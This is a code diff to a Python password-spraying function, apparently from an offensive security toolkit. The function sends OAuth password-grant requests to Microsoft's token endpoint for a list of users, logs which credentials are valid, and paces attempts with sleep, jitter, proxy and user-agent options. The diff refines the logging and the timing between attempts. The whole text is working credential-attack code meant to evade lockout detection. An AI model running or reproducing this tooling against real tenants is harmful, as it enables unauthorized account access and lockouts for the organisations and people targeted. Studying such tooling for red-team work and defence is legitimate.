@@ -208,9 +208,11 @@ def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None)
     } if proxy else None
 
     # Iterate over each user in the list
-    for user in user_list:
+    #for user in user_list:
+    for index, user in enumerate(user_list):
         body_params = {
             'resource': 'https://graph.windows.net',
+            #'resource': 'https://graph.microsoft.com',
             'client_id': client_id,
             'client_info': '1',
             'grant_type': 'password',
@@ -232,20 +234,21 @@ def password_spray(params, sleep=None, jitter=None, user_agent=None, proxy=None)
         response = requests.post(url, headers=post_headers, data=body_params, proxies=proxies)
         
         if response.status_code == 200:
-            logging.info(f"Password Valid found for {user} : {password}")
+            logging.info(f"Valid credentials found for user '{user}'")
         else:
             #print(response.json())
             error_description = response.json().get('error_description', '')
             error_code = response.json().get('error_codes', '')
             #error_codes = (' '.join(error_code))
             #print(error_description)
-            logging.info(f"Failed authentication attempt user {user} with error {error_code}")
+            logging.error(f"Authentication failed for user '{user}' with error code {error_code}")
 
-        # Apply fixed sleep time or variable sleep time with jitter
-        if sleep is not None:
-            if jitter is not None:
-                time.sleep(sleep + random.uniform(0, jitter))
-            else:
-                time.sleep(sleep)
+        # Apply sleep only if this is not the last auth attempt
+        if index < len(user_list) - 1:
+            if sleep is not None:
+                if jitter is not None:
+                    time.sleep(sleep + random.uniform(0, jitter))
+                else:
+                    time.sleep(sleep)                
 
     logging.info("Password spray attack completed")
